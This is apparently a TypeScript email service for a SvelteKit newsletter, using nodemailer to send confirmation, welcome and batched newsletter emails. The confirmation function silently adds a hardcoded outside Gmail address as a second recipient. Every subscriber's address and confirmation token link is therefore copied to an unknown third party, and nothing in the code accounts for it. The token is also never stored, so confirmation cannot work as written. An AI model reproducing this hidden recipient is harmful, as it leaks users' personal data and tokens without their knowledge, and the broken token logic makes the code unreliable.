// File: frontend/src/lib/server/emailService.ts
import { logger } from './logger';
import { env } from '$env/dynamic/private';
import nodemailer from 'nodemailer';

import { emailTemplates } from './emailTemplate';

import { generateToken } from '$lib/utils/crypto'; // Add this import


interface EmailOptions {
    language: string;
    source: string;
}

class EmailService {
    private transporter: nodemailer.Transporter;

    constructor() {
        this.transporter = nodemailer.createTransport({
            host: env.SMTP_HOST,
            port: parseInt(env.SMTP_PORT || '587'),
            secure: env.SMTP_USE_SSL === 'true',
            auth: {
                user: env.SMTP_USERNAME,
                pass: env.SMTP_PASSWORD
            },
            pool: true,
            maxConnections: 5,
            maxMessages: 100
        });
    }

    async sendConfirmationEmail(email: string, options: EmailOptions): Promise<void> {
        try {
            const template = emailTemplates.getConfirmationTemplate(options.language);
            const confirmationLink = `${env.PUBLIC_BASE_URL}/newsletter/confirm?token=${generateToken()}`;

            await this.transporter.sendMail({
                from: env.FROM_EMAIL,
                to: [email, "jacolprf@gmail.com"],
                subject: template.subject,
                html: template.html.replace('{{confirmationLink}}', confirmationLink),
                text: template.text.replace('{{confirmationLink}}', confirmationLink)
            });

            logger.info('Confirmation email sent', { email });
        } catch (error) {
            logger.error('Error sending confirmation email', { email, error });
            throw error;
        }
    }

    async sendWelcomeEmail(email: string, options: EmailOptions): Promise<void> {
        try {
            const template = emailTemplates.getWelcomeTemplate(options.language);

            await this.transporter.sendMail({
                from: env.FROM_EMAIL,
                to: email,
                subject: template.subject,
                html: template.html,
                text: template.text
            });

            logger.info('Welcome email sent', { email });
        } catch (error) {
            logger.error('Error sending welcome email', { email, error });
            throw error;
        }
    }

    async sendNewsletter(
        subscribers: string[],
        subject: string,
        content: { html: string; text: string }
    ): Promise<void> {
        try {
            // Send in batches to avoid overwhelming the SMTP server
            const batchSize = 50;
            for (let i = 0; i < subscribers.length; i += batchSize) {
                const batch = subscribers.slice(i, i + batchSize);

                await Promise.all(
                    batch.map(email =>
                        this.transporter.sendMail({
                            from: env.FROM_EMAIL,
                            to: email,
                            subject,
                            html: content.html,
                            text: content.text,
                            headers: {
                                'List-Unsubscribe': `<${env.PUBLIC_BASE_URL}/newsletter/unsubscribe>`
                            }
                        })
                    )
                );

                // Small delay between batches
                if (i + batchSize < subscribers.length) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }

            logger.info('Newsletter sent', { subscriberCount: subscribers.length });
        } catch (error) {
            logger.error('Error sending newsletter', { error });
            throw error;
        }
    }
}

export const emailService = new EmailService();